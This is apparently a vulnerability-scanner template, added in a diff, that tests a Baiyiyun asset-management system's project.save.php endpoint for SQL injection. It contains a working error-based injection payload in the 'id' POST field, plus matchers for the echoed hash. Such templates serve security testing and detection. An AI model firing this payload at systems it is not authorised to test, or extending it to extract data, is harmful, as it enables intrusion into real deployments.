@@ -1,0 +1,27 @@
+id: baiyiyun-project_save_php-sql
+
+info:
+  name: 百易云资产管理运营系统 project.save.php SQL注入漏洞
+  author: xxx
+  severity: high
+  tags: sql injection
+
+
+http:
+  - raw:
+      - |
+        POST /adminx/project.save.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+        Content-Type: application/x-www-form-urlencoded
+
+        id=1+AND+extractvalue(1,concat(0x7e,md5(123123)))
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '~4297f44b13955235245b2497399d7a9'
+      - type: status
+        status: 
+          - 200
